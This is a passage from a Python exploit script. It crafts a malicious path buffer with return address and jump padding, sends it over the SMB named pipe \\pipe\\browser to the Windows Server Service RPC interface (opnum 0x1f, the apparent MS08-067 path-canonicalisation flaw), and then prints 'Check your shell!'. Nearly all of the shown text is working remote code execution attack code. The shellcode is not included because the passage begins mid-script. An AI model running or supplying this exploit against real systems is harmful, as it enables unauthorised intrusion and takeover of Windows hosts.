		path += ret
path += jumper # Padding with embedded jump
path += "\x00" * 2 # NULL termination

server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

stub = ""
stub += server
stub += "\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00"
stub += path
stub += "\xE8\x03\x00\x00"
stub += prefix
stub += "\x01\x10\x00\x00\x00\x00\x00\x00"

print "[*] Initiating connection"
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % host)
trans.connect()
print "[+] Connected to ncacn_np:%s[\\pipe\\browser]" % host
dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
print "[*] Attempting to trigger the vulnerability..."
dce.call(0x1f, stub)
time.sleep(5)
print "[+] Check your shell!"
